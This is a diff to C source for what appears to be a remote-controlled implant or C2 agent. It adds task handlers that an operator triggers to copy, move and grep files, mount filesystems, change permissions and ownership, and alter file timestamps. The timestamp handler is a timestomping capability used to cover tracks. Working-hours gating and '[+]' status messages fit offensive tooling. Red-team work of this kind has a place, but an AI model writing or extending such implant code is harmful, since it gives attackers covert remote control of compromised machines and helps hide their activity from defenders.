@@ -67,6 +67,31 @@ static char* run_shell(const char *cmd) {
     return buf;
 }
 
+/* Escape an argument for the /bin/sh -c wrapper used by run_shell().  The
+ * extra backslashes preserve the inner double quotes through that wrapper. */
+static void shell_quote_arg(const char *in, char *out, size_t out_sz) {
+    size_t j = 0;
+    if (!out_sz) return;
+    if (j + 2 < out_sz) { out[j++] = '\\'; out[j++] = '"'; }
+    for (size_t i = 0; in && in[i] && j + 3 < out_sz; i++) {
+        unsigned char c = (unsigned char)in[i];
+        if (c == '"' || c == '\\' || c == '$' || c == '`') out[j++] = '\\';
+        out[j++] = (char)c;
+    }
+    if (j + 2 < out_sz) { out[j++] = '\\'; out[j++] = '"'; }
+    out[j] = '\0';
+}
+
+static void json_get_str(const char *json, const char *key, char *out,
+                         size_t out_sz, const char *def) {
+    if (!out || out_sz == 0) return;
+    out[0] = '\0';
+    if (!json || !agent_json_str(json, key, out, out_sz) || !out[0]) {
+        if (def) strncpy(out, def, out_sz - 1);
+        out[out_sz - 1] = '\0';
+    }
+}
+
 /* ── Working hours ───────────────────────────────────────────────────────── */
 int in_working_hours(void) {
     if (!g_working_hours[0]) return 1;
@@ -560,6 +585,98 @@ void dispatch_task(AgentTask *task) {
                 char err[128]; snprintf(err, sizeof(err), "rm: %s", strerror(errno));
                 agent_send_result(task->id, "", err);
             }
+        }
+
+    } else if (strcmp(type_upper, "CP") == 0 || strcmp(type_upper, "MV") == 0) {
+        char src[MAX_PATH] = {0}, dst[MAX_PATH] = {0};
+        json_get_str(args, "src", src, sizeof(src), "");
+        json_get_str(args, "dst", dst, sizeof(dst), "");
+        if (!src[0] || !dst[0]) {
+            agent_send_result(task->id, "", "usage: {src,dst}");
+        } else {
+            char qsrc[MAX_PATH * 2], qdst[MAX_PATH * 2], cmd[MAX_PATH * 4 + 32];
+            shell_quote_arg(src, qsrc, sizeof(qsrc));
+            shell_quote_arg(dst, qdst, sizeof(qdst));
+            snprintf(cmd, sizeof(cmd), "%s -R %s %s 2>&1",
+                     strcmp(type_upper, "CP") == 0 ? "cp" : "mv", qsrc, qdst);
+            char *out = run_shell(cmd);
+            if (out && out[0]) agent_send_result(task->id, out, "");
+            else agent_send_result(task->id, "[+] filesystem operation completed", "");
+            free(out);
+        }
+
+    } else if (strcmp(type_upper, "GREP") == 0) {
+        char pattern[512] = {0}, path[MAX_PATH] = {0};
+        json_get_str(args, "pattern", pattern, sizeof(pattern), "");
+        json_get_str(args, "path", path, sizeof(path), ".");
+        if (!pattern[0]) {
+            agent_send_result(task->id, "", "usage: {pattern,path}");
+        } else {
+            char qp[1024], qpath[MAX_PATH * 2], cmd[MAX_PATH * 3 + 64];
+            shell_quote_arg(pattern, qp, sizeof(qp));
+            shell_quote_arg(path, qpath, sizeof(qpath));
+            snprintf(cmd, sizeof(cmd), "grep -R -n -- %s %s 2>&1", qp, qpath);
+            char *out = run_shell(cmd);
+            agent_send_result(task->id, out ? out : "", "");
+            free(out);
+        }
+
+    } else if (strcmp(type_upper, "MOUNT") == 0) {
+        char path[MAX_PATH] = {0};
+        if (args[0] == '{') json_get_str(args, "path", path, sizeof(path), "");
+        else strncpy(path, args, sizeof(path) - 1);
+        char qpath[MAX_PATH * 2], cmd[MAX_PATH * 2 + 16];
+        if (path[0]) {
+            shell_quote_arg(path, qpath, sizeof(qpath));
+            snprintf(cmd, sizeof(cmd), "mount %s 2>&1", qpath);
+        } else snprintf(cmd, sizeof(cmd), "mount 2>&1");
+        char *out = run_shell(cmd);
+        agent_send_result(task->id, out ? out : "", "");
+        free(out);
+
+    } else if (strcmp(type_upper, "CHMOD") == 0) {
+        char mode_str[32] = {0}, path[MAX_PATH] = {0};
+        json_get_str(args, "mode", mode_str, sizeof(mode_str), "");
+        json_get_str(args, "path", path, sizeof(path), "");
+        char *end = NULL;
+        long mode = strtol(mode_str, &end, 8);
+        if (!mode_str[0] || !path[0] || !end || *end != '\0' || mode < 0 || mode > 07777) {
+            agent_send_result(task->id, "", "usage: {mode,path}");
+        } else if (chmod(path, (mode_t)mode) != 0) {
+            char err[128]; snprintf(err, sizeof(err), "chmod: %s", strerror(errno));
+            agent_send_result(task->id, "", err);
+        } else agent_send_result(task->id, "[+] chmod updated", "");
+
+    } else if (strcmp(type_upper, "CHOWN") == 0) {
+        char owner[128] = {0}, group[128] = {0}, path[MAX_PATH] = {0};
+        json_get_str(args, "owner", owner, sizeof(owner), "");
+        json_get_str(args, "group", group, sizeof(group), "");
+        json_get_str(args, "path", path, sizeof(path), "");
+        if (!owner[0] || !path[0]) {
+            agent_send_result(task->id, "", "usage: {owner,group,path}");
+        } else {
+            char who[256], qw[MAX_PATH * 2], qp[MAX_PATH * 2], cmd[MAX_PATH * 3 + 64];
+            snprintf(who, sizeof(who), "%s%s%s", owner, group[0] ? ":" : "", group);
+            shell_quote_arg(who, qw, sizeof(qw)); shell_quote_arg(path, qp, sizeof(qp));
+            snprintf(cmd, sizeof(cmd), "chown %s %s 2>&1", qw, qp);
+            char *out = run_shell(cmd);
+            agent_send_result(task->id, out ? out : "", "");
+            free(out);
+        }
+
+    } else if (strcmp(type_upper, "CHTIMES") == 0) {
+        char mtime[64] = {0}, path[MAX_PATH] = {0};
+        json_get_str(args, "mtime", mtime, sizeof(mtime), "");
+        json_get_str(args, "path", path, sizeof(path), "");
+        if (!mtime[0] || !path[0]) {
+            agent_send_result(task->id, "", "usage: {mtime,path}");
+        } else {
+            char qm[128], qp[MAX_PATH * 2], cmd[MAX_PATH * 2 + 64];
+            shell_quote_arg(mtime, qm, sizeof(qm)); shell_quote_arg(path, qp, sizeof(qp));
+            snprintf(cmd, sizeof(cmd), "touch -d %s %s 2>&1", qm, qp);
+            char *out = run_shell(cmd);
+            agent_send_result(task->id, out && out[0] ? out : "[+] timestamps updated", "");
+            free(out);
         }
 
     } else if (strcmp(type_upper, "UPLOAD") == 0) {
